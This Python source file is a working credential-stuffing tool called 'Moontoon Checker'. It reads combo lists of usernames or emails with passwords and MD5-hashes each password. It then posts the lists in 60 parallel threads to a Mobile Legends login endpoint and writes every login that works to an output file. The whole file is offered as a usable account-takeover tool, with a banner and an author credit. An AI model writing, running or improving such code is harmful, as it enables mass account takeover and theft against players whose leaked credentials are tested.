import httpx

import hashlib

import json

import time

from rich.console import Console

from rich.text import Text

import pyfiglet

import re

import atexit

import sys

import concurrent.futures

# Initialize console for rich output

console = Console()

def hash_md5(text: str) -> str:

    """Returns the MD5 hash of the given text."""

    return hashlib.md5(text.encode('utf-8')).hexdigest()

def print_banner():

    """Prints the ASCII banner for the account checker tool with a smaller font."""

    ascii_banner = pyfiglet.figlet_format("Moontoon Checker", font="slant")

    console.print(f"[bold cyan]{ascii_banner}[/bold cyan]")

    console.print(Text("       Developed by: KiritaniShinyaa", style="bold yellow"))

def exit_message():

    """Displays an exit message when the program ends."""

    console.print("\n[bold magenta]Program terminated. Thank you for using the Validity Checker![/bold magenta]")

# Register the exit handler

atexit.register(exit_message)

def load_file():

    """Loads the input file and returns the lines."""

    while True:

        try:

            filename = input('[?] Enter filename: ')

            if not filename.strip():

                console.print("[bold red]Error: No file name provided! Please try again.[/bold red]")

                continue

            with open(filename, 'r') as file:

                lines = file.readlines()

            # Check if lines are empty

            if not lines:

                console.print("[bold red]Error: The file is empty! Please try again.[/bold red]")

                continue

            return lines

        except FileNotFoundError:

            console.print(Text("Error: File not found! Please try again.", style="bold red"))

        except KeyboardInterrupt:

            console.print("\n[bold yellow]Operation cancelled by user. Exiting...[/bold yellow]")

            sys.exit(0)

def check_account(line, successful_creds, error_creds, success_count, incorrect_password_count, no_account_count, other_count, invalid_format_count, index, total_accounts):

    """Handles checking of a single account."""

    line = line.strip()

    if not line or not re.match(r"^[^:]+[:].+$", line):

        console.print(f"[bold yellow][INVALID] - Invalid format: {line}[/bold yellow]")

        invalid_format_count[0] += 1

        return

    try:

        username, password = re.split("[:]", line, maxsplit=1)

    except ValueError:

        console.print(f"[bold yellow][INVALID] - Invalid format: {line}[/bold yellow]")

        invalid_format_count[0] += 1

        return

    md5_password = hash_md5(password.strip())

    data = {

        'account': username.strip(),

        'md5pwd': md5_password,

        'module': 'mpass',

        'type': 'web',

        'app_id': '668'

    }

    response = httpx.post('https://sg-api.mobilelegends.com/base/login', data=data)

    try:

        res = response.json()

    except json.JSONDecodeError:

        console.print(f"[bold gray][ERROR] - Response error for {username.strip()}[/bold gray]")

        error_creds.append(f"{username.strip()}:{password.strip()} (Response error)")

        return

    msg = res.get('msg')

    if msg == "ok":

        successful_creds.append(f"{username.strip()}:{password.strip()}")

        console.print(f"[bold white on green][SUCCESS] - Valid: {username.strip()}[/bold white on green]")

        success_count[0] += 1

    elif msg == "Error_PasswdError":

        console.print(f"[bold white on red][FAILED] - Incorrect password for {username.strip()}[/bold white on red]")

        incorrect_password_count[0] += 1

        error_creds.append(f"{username.strip()}:{password.strip()} (Incorrect password)")

    elif msg == "Error_NoAccount":

        console.print(f"[bold black on yellow][FAILED] - Account does not exist for {username.strip()}[/bold black on yellow]")

        no_account_count[0] += 1

        error_creds.append(f"{username.strip()}:{password.strip()} (Account not found)")

    else:

        console.print(f"[bold black on white][ERROR] - Unknown response for {username.strip()}[/bold black on white]")

        other_count[0] += 1

        error_creds.append(f"{username.strip()}:{password.strip()} (Unknown response)")

    if index % 60 == 0 or index == total_accounts:

        console.print(f"[bold cyan]Checked {index}/{total_accounts} accounts[/bold cyan]")

def main():

    print_banner()

    console.print('[bold yellow][!] We accept User:Pass, Email:Pass, or Login:Pass[/bold yellow]')

    lines = load_file()

    try:

        output_filename = input('[?] Leave it blank: ')

        if not output_filename.strip():

            output_filename = 'validity-checked'

    except KeyboardInterrupt:

        console.print("\n[bold yellow]Operation cancelled by user. Exiting...[/bold yellow]")

        sys.exit(0)

    successful_file = f"{output_filename}.txt"

    error_file = f"{output_filename}-die.txt"

    total_accounts = len(lines)

    console.print(f"[bold cyan]Starting check for {total_accounts} accounts...[/bold cyan]")

    successful_creds = []

    error_creds = []

    success_count = [0]

    incorrect_password_count = [0]

    no_account_count = [0]

    other_count = [0]

    invalid_format_count = [0]

    # Using ThreadPoolExecutor for multithreading

    with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:

        futures = []

        for index, line in enumerate(lines, start=1):

            futures.append(executor.submit(check_account, line, successful_creds, error_creds, success_count, incorrect_password_count, no_account_count, other_count, invalid_format_count, index, total_accounts))

        # Wait for all threads to finish

        concurrent.futures.wait(futures)

    if successful_creds:

        with open(successful_file, 'w') as output_file:

            output_file.write('\n'.join(successful_creds))

        console.print(f"[bold green]\nResults saved successfully to {successful_file}[/bold green]")

    else:

        console.print("[bold yellow]\nNo successful logins found, nothing saved[/bold yellow]")

    if error_creds:

        with open(error_file, 'w') as error_output_file:

            error_output_file.write('\n'.join(error_creds))

        console.print(f"[bold red]Errors saved successfully to {error_file}[/bold red]")

    else:

        console.print("[bold yellow]No errors found, nothing saved to die file[/bold yellow]")

    console.print("\n[bold cyan]Final Summary[/bold cyan]")

    console.print(f"[bold white]Total Accounts Checked: {total_accounts}[/bold white]")

    console.print(f"[bold green]Valid Accounts: {success_count[0]}[/bold green]")

    console.print(f"[bold red]Incorrect Passwords: {incorrect_password_count[0]}[/bold red]")

    console.print(f"[bold yellow]Invalid Formats: {invalid_format_count[0]}[/bold yellow]")

    console.print(f"[bold black on yellow]Nonexistent Accounts: {no_account_count[0]}[/bold black on yellow]")

    console.print(f"[bold gray]Errors: {other_count[0]}[/bold gray]")

if __name__ == "__main__":

    main()
